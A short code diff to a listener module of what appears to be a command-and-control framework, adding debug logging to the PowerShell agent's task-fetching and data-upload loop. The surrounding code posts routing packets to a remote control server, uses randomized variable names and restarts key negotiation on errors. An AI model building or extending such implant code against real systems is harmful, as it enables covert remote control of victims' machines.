@@ -857,7 +857,7 @@ class Listener:
                             }}
                         }}
                         catch [Net.WebException] {{
-                            "got an exception net web"|Out-File "out.log" -Append -NoClobber
+                            "gettask got an exception net web"|Out-File "out.log" -Append -NoClobber
                             $_.Exception.GetBaseException()|Out-File "out.log" -Append -NoClobber
                             if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
@@ -898,10 +898,18 @@ class Listener:
                                 try {{
                                     # get a random posting URI
                                     $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                    "using taskuri:"|Out-File "out.log" -Append -NoClobber
+                                    $taskURI|Out-File "out.log" -Append -NoClobber
+
+
                                     $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                     $response
                                 }}
                                 catch [System.Net.WebException]{{
+                                    "exception while uploading"|Out-File "out.log" -Append -NoClobber
+                                    $_.Exception.GetBaseException().Response.statuscode |Out-File "out.log" -Append -NoClobber
+
+
                                     # exception posting data...
                                     if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
